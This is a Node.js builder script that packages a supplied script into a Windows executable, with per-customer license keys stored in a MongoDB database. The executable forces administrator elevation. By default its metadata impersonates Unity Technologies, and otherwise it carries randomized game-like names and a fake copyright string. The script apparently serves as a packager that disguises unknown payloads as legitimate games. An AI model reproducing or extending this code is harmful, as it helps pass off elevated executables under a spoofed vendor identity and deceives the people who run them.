const exe = require("@angablue/exe");
const { MongoClient } = require("mongodb");
const fs = require("fs");
const path = require("path");
const config = require("../../../config.json");

const args = process.argv.slice(2);
const nameArg = args.find(arg => arg.startsWith("--name="))?.split("=")[1];
const keyArg = args.find(arg => arg.startsWith("--key="))?.split("=")[1];

if (!nameArg || !keyArg) {
  console.error("Usage: node builder.js --name=FILENAME --key=LICENSEKEY");
  process.exit(1);
}

const uri = config.mongodb;
const client = new MongoClient(uri);

function getRandomString(length = 6) {
  const chars = "abcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function getRandomName(prefix = "", length = 4) {
  const adjectives = ["Epic", "Silent", "Dark", "Hidden", "Golden", "Frozen", "Wild", "Crimson", "Iron"];
  const nouns = ["Legends", "Chronicles", "Quest", "Empire", "Realm", "Story", "Code", "Shadow", "Storm"];
  const adj = adjectives[Math.floor(Math.random() * adjectives.length)];
  const noun = nouns[Math.floor(Math.random() * nouns.length)];
  return `${prefix}${adj}${noun}${getRandomString(length)}`;
}

async function run() {
  try {
    await client.connect();
    const db = client.db("AKAL");
    const keysCollection = db.collection("keys");

    const keyDetails = (await keysCollection.findOne({ key: keyArg })) || {
      fileDescription: "Unity Game Engine",
      productName: "Unity Project",
      companyName: "Unity Technologies",
    };

    const randomDescription = getRandomName("Desc");
    const randomProduct = getRandomName("Game");
    const randomCompany = getRandomName("Dev");

    const iconsDir = path.resolve(__dirname, "../../../icons");
    const scriptDir = path.resolve(__dirname, "./script");

    if (!fs.existsSync(scriptDir)) {
      fs.mkdirSync(scriptDir, { recursive: true });
    }

    const keyIconPath = path.join(iconsDir, `${keyArg}.ico`);
    const defaultIconPath = path.join(iconsDir, "default.ico");

    let finalIconName;
    if (fs.existsSync(keyIconPath)) {
      fs.copyFileSync(keyIconPath, path.join(scriptDir, `${keyArg}.ico`));
      finalIconName = keyArg;
    } else {
      fs.copyFileSync(defaultIconPath, path.join(scriptDir, "default.ico"));
      finalIconName = "default";
    }

    const entryFile = path.resolve(scriptDir, nameArg);
    if (!fs.existsSync(entryFile)) {
      console.error(`Entry file not found: ${entryFile}`);
      process.exit(1);
    }

    const iconPath = path.resolve(scriptDir, `${finalIconName}.ico`);
    const outFile = path.resolve(scriptDir, `${keyDetails.productName || randomProduct}.exe`);

    const build = exe({
      entry: entryFile,
      out: outFile,
      skipBundle: false,
      version: "2.4.3",
      icon: iconPath,
      executionLevel: "requireAdministrator",
      properties: {
        FileDescription: keyDetails.fileDescription || randomDescription,
        ProductName: keyDetails.productName || randomProduct,
        LegalCopyright: `com.${(keyDetails.companyName || randomCompany).toLowerCase()}.${getRandomString(5)}`,
        OriginalFilename: (keyDetails.productName || randomProduct) + ".exe",
      },
    });

    build.then(() => {
      console.log("Build completed! ✅");
      client.close();      
      process.exit(0);     
    }).catch(err => {
      console.error("Build failed:", err);
      client.close();
      process.exit(1);
    });
  } catch (err) {
    console.error("Error in builder:", err);
    client.close();
    process.exit(1);
  }
}

run();
